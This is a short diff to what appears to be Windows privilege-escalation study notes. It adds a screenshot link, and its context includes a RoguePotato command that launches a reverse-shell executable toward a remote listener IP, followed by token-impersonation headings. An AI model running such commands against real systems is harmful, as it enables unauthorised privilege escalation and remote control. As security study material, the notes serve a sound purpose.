@@ -420,5 +420,9 @@ Now from within this shell I can use the rottenpotato exploit to impersonate the
   
   `C:\PrivEsc\RoguePotato.exe -r 10.6.77.38 -e "C:\PrivEsc\reverse.exe" -l 9999`
   
+
+  ![image](https://user-images.githubusercontent.com/83407557/183311964-050e0732-e55d-4263-90e0-a17ab3f54a1d.png)
+
+  
 ## Token Impersonation - PrintSpoofer
 ## Privilege Escalation Scripts
